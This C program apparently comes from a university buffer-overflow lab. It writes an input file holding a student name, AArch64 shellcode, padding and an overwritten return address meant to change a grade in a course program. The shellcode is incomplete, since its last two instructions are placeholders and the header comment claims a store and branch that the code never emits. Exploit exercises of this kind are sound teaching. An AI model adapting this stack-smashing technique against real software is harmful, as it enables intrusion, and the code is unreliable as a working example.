/* Produces a file called dataA with the student name, a null byte,
padding to overrun the stack, and shellcode that sets grade='A'
followed by a branch back to main. The return address is overwritten
to point to the shellcode in the name array. */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* Writes binary data to dataA file to exploit buffer overflow.
Takes no command line arguments, reads nothing from stdin,
writes attack data to dataA file, writes nothing to stdout,
returns 0 on success. */
int main(void) {
    FILE *fp;
    int i;
    unsigned int instr1, instr2, instr3, instr4;
    uint64_t shellcode_addr;
    unsigned char *bytes;
    
    fp = fopen("dataA", "wb");
    
    /* write student name */
    fwrite("Kevin", 1, 5, fp);
    
    /* write null terminator */
    fputc('\0', fp);
    
    /* generate shellcode instructions using literal addresses */
    /* use adr with a closer target to avoid negative displacement */
    /* instruction 1: adr x0, 0x42005e */
    instr1 = MiniAssembler_adr(0, 0x42005e, 0x42005e);  

    /* instruction 2: mov w1, #0x41 (load 'A') */  
    instr2 = MiniAssembler_mov(1, 0x41);

    /* then we'll manually set the grade address and store */
    /* for now, let's just try a simple mov and branch */
    instr3 = MiniAssembler_mov(2, 0);  /* mov w2, #0 - simple test */
    instr4 = MiniAssembler_mov(3, 0);  /* mov w3, #0 - simple test */
    
    /* write shellcode bytes (instructions 1-4, 16 bytes total) */
    bytes = (unsigned char *)&instr1;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr2;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr3;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr4;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    /* padding to fill remaining buf space (48 - 6 - 16 = 26 bytes) */
    for (i = 0; i < 26; i++) {
        fputc('A', fp);
    }
    
    /* target address 0x42005e in little-endian */
    shellcode_addr = 0x42005e;
    fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);
    
    /* Write final newline to terminate input properly */
    fputc('\n', fp);
    
    fclose(fp);
    return 0;
}